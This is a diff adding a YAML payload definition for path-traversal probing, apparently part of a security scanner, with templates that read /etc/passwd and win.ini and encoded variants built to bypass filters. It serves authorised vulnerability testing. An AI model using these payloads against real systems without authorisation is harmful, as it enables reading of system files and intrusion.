@@ -1,0 +1,52 @@
+family_id: path_traversal
+description: >-
+  File-system path-traversal probes covering UNIX/Windows separators,
+  encoded variants, and absolute-path overrides. Read-only seeds — every
+  payload targets a benign control file (/etc/passwd, win.ini); destructive
+  variants must be authored by the operator in a separate approved YAML.
+cwe_ids: [22, 23, 35]
+owasp_top10:
+  - 'A01:2021'
+risk_level: medium
+requires_approval: false
+oast_required: false
+payloads:
+  - id: unix_basic
+    template: '../../../../etc/passwd'
+    confidence: likely
+    notes: Canonical Unix probe; differential vs control file confirms read.
+  - id: windows_basic
+    template: '..\\..\\..\\..\\windows\\win.ini'
+    confidence: likely
+    notes: Windows variant with backslash separators.
+  - id: encoded_dot
+    template: '%2e%2e/%2e%2e/etc/passwd'
+    confidence: likely
+    notes: Percent-encoded dots; bypasses simple substring filters.
+  - id: double_encoded
+    template: '%252e%252e/%252e%252e/etc/passwd'
+    confidence: suspected
+    notes: Double-encoded dots; bypasses one-pass-decoding gateways.
+  - id: absolute_unix
+    template: '/etc/passwd'
+    confidence: suspected
+    notes: Absolute path override; tests insufficient root-jail.
+  - id: utf8_overlong
+    template: '%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
+    confidence: suspected
+    notes: Overlong-UTF8 dot bypass; legacy parser research.
+mutations:
+  - name: case_flip
+    description: Path components on Windows are case-insensitive — flips for research.
+  - name: comment_injection
+    description: Inline comment markers (rare but supported by a few sinks).
+encodings:
+  - name: identity
+    stages: []
+    description: Raw path payload.
+  - name: url_only
+    stages: [url]
+    description: URL-encoded for query-string sinks.
+  - name: url_double
+    stages: [url_double]
+    description: Double URL-encoded for one-pass-decoding gateways.
